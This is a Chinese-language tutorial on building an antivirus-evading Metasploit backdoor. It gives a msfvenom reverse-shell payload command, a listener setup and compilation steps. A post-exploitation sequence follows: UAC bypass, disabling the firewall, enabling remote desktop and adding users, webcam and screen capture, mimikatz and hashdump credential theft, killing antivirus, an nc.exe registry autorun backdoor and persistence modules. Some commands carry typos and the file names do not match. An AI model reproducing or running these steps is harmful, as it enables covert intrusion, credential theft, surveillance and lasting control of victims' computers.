利用metasploit生成免杀后门

①在kali中生成shellcode免杀

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=192.168.0.124 lport=5555 -f c -o /home/sha.c

注：-e：指定编码方式；-i：指定编码次数；-b：去除指定代码，一般是空代码或者是错误代码；-f：指定生成格式；-o：指定输出路径。

②执行上述代码之后，会生成test.c，路径为/home/test.c

④用vc++6.0来编译test.c文件

会生成一个Debug文件夹，里面有个test.exe，那就是免杀后门程序。

⑤再打开msfconsole监听

msfconsole #打开msf

use exploit/multi/handler

set paylod windows/meterpreter/reverse_tcp

set lhost 192.168.0.124

set lport 5555

exploit #开始监听

⑥目标机运行test.exe，就能拿到shell了。

⑦得到shell后，尝试利用getuid和getsystem命令来提权：

结果可以判定遭到了UAC的用户访问控制的拦截！尝试绕过：

use exploit/windows/local/ask

set session 1

exploit

成功执行后，会在目标系统上弹出一个确认框点击即可成功绕过！再来看看shell权限：

命令：

①通过shell来关闭防火墙：

shell

netsh adcfirewall set allprofiles state off

但隐蔽性不高，容易被发现，可以通过策略的添加，来隐蔽行为！

netsh firewall add portopening TCP 444 “VMWARE” ENABLE ALL

伪装成一个系统正常的进程，之后远程重启目标系统，并利用 NC 连接！

②开启3389远程桌面：

run post/windows/manage/enable_rdp

还可以使用 run getgui -e来开启远程桌面；

run getgui -u xxxxx -p xxxxx在目标机器添加用户

③截屏：screenshot

开启机器电脑屏幕：run vnc

摄像头：webcam_list

密码：load mimikatz ； kerberos

获取目标系统上的hash值：use post/windows/gather/hashdump

set session 1 ; exploit

关闭杀毒软件：run killav

④利用注册表添加 NC 后门：

上传 NC 到目标系统：upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32

枚举注册表内容（开机启动)：reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run

在该注册表增加内容（开机启动)：reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d “C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe”

查看内容是否增加成功：reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc

⑤权限维持

有很多种方法，列举MSF权限维持：

①Persistence模块

run persistence -U -i 10 -p 4444 -r 192.168.0.124

重启还会反弹shell

②Metsvc模块

run metsvc -A 重启还会反弹shell
